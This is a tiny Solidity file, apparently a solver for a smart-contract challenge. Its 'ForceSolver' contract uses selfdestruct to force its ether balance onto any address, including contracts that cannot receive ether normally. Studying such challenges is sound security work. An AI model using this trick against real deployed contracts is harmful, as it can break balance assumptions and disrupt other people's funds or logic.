pragma solidity ^0.4.18;

contract Meow {}

contract ForceSolver {

    function end(address adr) external payable {
        selfdestruct(adr);
    }
}